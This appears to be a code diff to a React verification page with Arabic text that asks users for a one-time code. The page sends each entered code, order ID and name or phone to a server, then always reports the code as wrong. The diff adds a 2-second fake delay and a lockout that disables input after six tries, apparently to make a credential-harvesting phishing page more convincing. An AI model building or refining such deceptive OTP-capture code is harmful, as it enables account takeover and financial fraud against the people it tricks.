@@ -21,6 +21,7 @@ export default function VerifyPage() {
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
   const [cooldown, setCooldown] = useState(0);
+  const [blocked, setBlocked] = useState(false);
 
   useEffect(() => {
     const raw = sessionStorage.getItem("verify_data");
@@ -57,6 +58,7 @@ export default function VerifyPage() {
     if (attempts > 6) {
       sessionStorage.removeItem(attemptsKey);
       sessionStorage.removeItem("verify_data");
+      setBlocked(true);
       let countdown = 5;
       setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
       const interval = setInterval(() => {
@@ -76,6 +78,7 @@ export default function VerifyPage() {
         body: JSON.stringify({ code: digits, orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
       });
     } catch {}
+    await new Promise(r => setTimeout(r, 2000));
     setSubmitting(false);
     setOtp("");
     setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
@@ -129,12 +132,13 @@ export default function VerifyPage() {
               maxLength={6}
               placeholder="أدخل رمز التحقق"
               value={otp}
-              onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
+              onChange={e => { if (blocked) return; setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
               onBlur={() => {
                 const d = otp.replace(/\D/g, "");
                 if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
               }}
-              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
+              disabled={blocked}
+              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors disabled:opacity-40"
               dir="ltr"
             />
             {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
@@ -147,13 +151,14 @@ export default function VerifyPage() {
               </p>
             ) : (
               <button onClick={async () => {
+                if (blocked) return;
                 setTimer(41);
                 await fetch("/api/resend", {
                   method: "POST",
                   headers: { "Content-Type": "application/json" },
                   body: JSON.stringify({ orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
                 });
-              }} className="text-xs font-bold text-[#1A2E44] underline underline-offset-2">
+              }} disabled={blocked} className="text-xs font-bold text-[#1A2E44] underline underline-offset-2 disabled:opacity-40 disabled:cursor-not-allowed">
                 إعادة إرسال الرمز
               </button>
             )}
@@ -161,7 +166,7 @@ export default function VerifyPage() {
 
           <button
             onClick={handleSubmit}
-            disabled={submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
+            disabled={blocked || submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
             className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
             style={{ background: "#1A2E44" }}
           >
